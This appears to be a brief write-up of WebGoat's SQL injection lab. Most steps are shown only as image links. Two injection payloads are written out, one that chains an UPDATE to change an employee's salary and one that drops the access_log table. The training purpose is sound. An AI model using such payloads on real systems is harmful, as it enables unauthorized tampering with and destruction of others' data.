## WebGoat: SQL Injection

What is SQL? ![alt text](image.png)

DML ![alt text](image-1.png)

DDL ![alt text](image-2.png)

DCL ![alt text](image-3.png)

String SQL Injection ![alt text](image-4.png)

Numberic SQL injection ![alt text](image-5.png)

Compromising confidentiality with String SQL injection ![alt text](image-6.png)

Compromising Integrity with Query chaining ![alt text](image-7.png)
Smith'; UPDATE employees SET salary=999999 WHERE last_name='Smith' AND first_name='John' --

Compromising Availability ![alt text](image-8.png)
'; DROP TABLE access_log --